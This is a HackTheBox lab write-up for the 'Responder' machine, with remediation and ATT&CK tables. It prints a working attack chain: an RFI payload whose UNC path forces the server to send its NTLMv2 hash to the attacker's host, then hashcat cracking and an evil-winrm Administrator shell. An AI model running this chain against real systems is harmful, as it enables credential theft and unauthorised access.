# Responder — HackTheBox Starting Point

**Platform:** HackTheBox — Starting Point  
**OS:** Windows  
**Difficulty:** Very Easy  
**Date:** 27 September 2026  
**Flag:** ea81b7afddd03efaa0945333ed147fac  

---

## Summary

Windows machine running a PHP web application vulnerable to 
File Inclusion (LFI/RFI). The ?page= parameter accepts UNC 
network paths, forcing the server to authenticate against an 
attacker-controlled SMB server. Responder captures the NTLMv2 
hash of Administrator, cracked offline with hashcat to obtain 
the password. Final access via evil-winrm on port 5985.

**Attack chain:** nmap → /etc/hosts → LFI discovery (?page=) 
→ RFI via UNC path → NTLMv2 capture (Responder) 
→ offline crack (hashcat -m 5600) → WinRM shell → flag

---

## Reconnaissance

### Port Scan

```bash
sudo nmap -sS -Pn --min-rate 5000 -p- 10.129.237.244 -oN Responder.txt
```

**-Pn required** — machine blocks ICMP ping probes.
PORT STATE SERVICE
80/tcp open http → PHP web application
5985/tcp open wsman → WinRM (target for final access)


No SMB (445), no RDP (3389), no Kerberos (88/389).  
Only attack vector is the web application on port 80.

---

## Enumeration

### Virtual Host Resolution

Visiting `http://10.129.237.244` redirected to `unika.htb`.  
Added to /etc/hosts to resolve locally:

```bash
echo "10.129.237.244  unika.htb" | sudo tee -a /etc/hosts
```

### File Inclusion Discovery

Site has a language selector. Clicking FR revealed:

http://unika.htb/index.php?page=french.html


The `?page=` parameter passes values directly to PHP `include()`.  
No input validation — classic File Inclusion vulnerability.

**Parameters indicating possible LFI/RFI:**  
`?page=` `?file=` `?include=` `?path=` `?doc=` `?view=`

---

## Exploitation

### LLMNR/NTLMv2 Poisoning with Responder

When PHP `include()` processes a UNC path like `//IP/resource`,  
Windows automatically initiates SMB authentication to that IP,  
sending the NTLMv2 hash of the running user without any prompt.

**Step 1 — Start Responder:**

```bash
sudo responder -I tun0 -v
```

**Step 2 — Trigger the connection via browser:**

http://unika.htb/index.php?page=//10.10.14.12/test


**Step 3 — Responder captures the hash:**

[SMB] NTLMv2-SSP Username : RESPONDER\Administrator
[SMB] NTLMv2-SSP Hash : Administrator::RESPONDER:232e474aac8cb0ba:AF90D...


### Offline Hash Cracking

```bash
echo "Administrator::RESPONDER:232e474aac8cb0ba:AF90D..." > hash.txt
hashcat -m 5600 hash.txt /usr/share/wordlists/rockyou.txt
```

**Result:**

Status: Cracked
Administrator::RESPONDER:... : badminton


**Credentials obtained:** `Administrator : badminton`

---

## Post-Exploitation

### WinRM Access

```bash
evil-winrm -i 10.129.237.244 -u Administrator -p badminton
```

Evil-WinRM PS C:\Users\Administrator\Documents> whoami
responder\administrator


### System Enumeration

```powershell
net user
dir C:\Users\
```

Users found: Administrator, mike, Public

### Finding the Flag

Flag was not on Administrator's Desktop.  
Used recursive search across all user profiles:

```powershell
Get-ChildItem -Recurse C:\Users\ -Filter flag.txt 2>$null
```

Directory: C:\Users\mike\Desktop
flag.txt


```powershell
type C:\Users\mike\Desktop\flag.txt
ea81b7afddd03efaa0945333ed147fac
```

---

## Findings

| # | Vulnerability | Severity | Remediation |
|---|---|---|---|
| 1 | File Inclusion in ?page= parameter | Critical | Whitelist allowed files, never pass user input to include() |
| 2 | Weak credentials (Administrator:badminton) | Critical | Strong password policy, MFA |
| 3 | WinRM exposed without IP restriction | High | Restrict port 5985 to admin IPs via firewall |
| 4 | NTLMv2 crackeable offline | High | Long complex passwords, disable NTLM where possible |
| 5 | PHP processes UNC network paths | Medium | Disable allow_url_include in php.ini |

---

## MITRE ATT&CK Mapping

| Tactic | Technique | ID |
|---|---|---|
| Reconnaissance | Active Scanning | T1595.001 |
| Initial Access | Exploit Public-Facing Application | T1190 |
| Credential Access | Adversary-in-the-Middle: LLMNR/NBT-NS | T1557.001 |
| Credential Access | Brute Force: Password Cracking | T1110.002 |
| Lateral Movement | Remote Services: WinRM | T1021.006 |
| Discovery | File and Directory Discovery | T1083 |
| Collection | Data from Local System | T1005 |

